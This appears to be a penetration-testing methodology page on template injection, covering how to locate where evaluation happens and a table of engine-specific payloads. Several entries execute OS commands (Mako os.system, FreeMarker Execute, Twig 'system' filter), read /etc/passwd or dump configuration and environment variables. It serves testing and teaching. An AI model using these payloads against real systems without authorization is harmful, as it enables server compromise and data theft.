# Server-side and client-side template injection

[Home](../README.md) · [Web enumeration](Enumeration.md) · [Command injection](Command-Injection.md)

## Identify where evaluation occurs

The supplied `CSTI` list mixes client-side expressions with server-side engines. Treat evaluation location and engine identity as separate questions.

1. Submit a unique marker and a small arithmetic expression in an observed input.
2. Inspect the raw HTTP response before JavaScript runs.
3. Compare the rendered DOM with that response.
4. Repeat with a different calculation and confirm the output changes as expected.

If evaluation happens before the response is sent, investigate server-side template injection (SSTI). If it happens only in a browser framework, investigate client-side template injection (CSTI), often leading to script execution in that origin.

## Small probes

```text
{{7*7}}
${7*7}
<%= 7*7 %>
#{7*7}
[[${7*7}]]
```

A response containing `49` is a clue, not an engine fingerprint on its own. Some frameworks escape or display expressions as text. Do not assume a generic `${...}` payload is valid in every Java or JavaScript stack.

## Engine-specific leads from the sources

| Engine/context | Representative expression | What must be established |
|---|---|---|
| Jinja2 / Flask | `{{config.items()}}` | Flask objects are in scope and sandbox/attribute access permits the expression. |
| Jinja2 | `{{cycler.__init__.__globals__.os}}` | The global object path is available in that environment. |
| Mako | `${self.module.cache.util.os.system("id")}` | Mako object graph and imports match; the many equivalent source paths are not universal. |
| Ruby ERB | `<%= File.open('/etc/passwd').read %>` | Input is rendered as ERB with file access. |
| FreeMarker | `<#assign ex = "freemarker.template.utility.Execute"?new()>${ex("id")}` | Dangerous class construction is allowed by configuration. |
| Spring expression language | `${T(java.lang.System).getenv()}` | An expression evaluator exposes Java type access. |
| Thymeleaf / Spring | `*{7*7}` or `[[${7*7}]]` | Exact evaluation context and engine configuration. |
| Twig | `{{['id']\|filter('system')}}` | A vulnerable/compatible version and callable filter behavior. |
| Smarty | `{$smarty.version}` | Smarty syntax is processed; legacy `{php}` behavior is version/configuration dependent. |
| Java-backed template object | `{{'a'.getClass()}}` | Java objects/methods are exposed; unrelated engines will reject it. |

These are diagnostic references for matching environments, not a list to submit indiscriminately. Prefer a harmless expression before a file read or process execution.

## Fragile patterns removed from the main workflow

Hard-coded Python `__subclasses__()[40]`, `[227]` and `[396]` indices vary with runtime and loaded classes. Python 2 examples using `__mro__[2]` do not transfer directly to Python 3 strings. If an object-graph path is part of a confirmed lab technique, identify the desired class by name and inspect the actual runtime.

The source also contains long repetitions of Mako paths, arithmetic spacing variants and a combined multi-engine delimiter string. Their underlying ideas are represented above. Long payload strings and reverse-shell content are unnecessary until the engine and access path are established.

## Next step

Record the injection input, engine evidence, raw response and reachable objects. Separate source/configuration disclosure from OS command execution. If code execution is established, confirm the service identity and follow the [command-execution checks](Command-Injection.md#blind-execution).
